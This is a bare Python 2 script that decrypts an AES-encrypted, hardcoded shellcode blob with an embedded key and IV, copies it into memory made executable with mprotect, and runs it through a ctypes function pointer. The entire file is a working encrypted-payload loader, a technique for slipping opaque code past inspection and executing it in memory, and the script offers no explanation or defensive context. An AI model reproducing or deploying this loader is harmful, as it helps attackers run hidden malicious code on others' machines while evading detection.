from Crypto.Cipher import AES
import sys
import base64
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
from sys import argv

libc = CDLL('libc.so.6')

def data_manipulation(encodedtext, offset):
    k = encodedtext[:-offset]
    b64dec = base64.b64decode(k)
    aes_append = b64dec + "A"*offset
    return aes_append

def decryptor(ciphertext, offset):
    obj=AES.new("th1s_1s_s3cretC0de187652", AES.MODE_CBC, "s0meIVkeywh1ch1s")
    t=obj.decrypt(ciphertext)
    p=data_manipulation(t, offset)
    decoded =""
    for x in bytearray(p) :
        decoded += '\\x'
        enc = '%02x' % (x & 0xff)
        decoded += enc
    shellcode = decoded[0:-offset*4]
    return shellcode

def main():
    offset = int(sys.argv[1])
    ciphertext = ("\xb1\xb1\xe5\xcf\x71\xfc\x3c\xac\xaf\x2a\xf5\xf4\xfc\x53\x71\x2a\xd6\x4b\xc7\xa7\x12\xf4\x1e\xca\x79\x41\xb7\x26\x17\x10\xa0\x72\x15\x3d\xa9\x14\x0e\x5b\xe3\x1f\x22\xb4\xe0\x4f\x3b\x7e\xf7\x7a")
    shellcode = decryptor(ciphertext, offset)

    hex_format = shellcode.replace('\\x', '').decode('hex')

    sc = c_char_p(hex_format)
    size = len(hex_format)
    addr = c_void_p(libc.valloc(size))
    memmove(addr, sc, size)
    libc.mprotect(addr, size, 0x7)
    run = cast(addr, CFUNCTYPE(c_void_p))
    run()
    
if __name__ == '__main__':
    main()
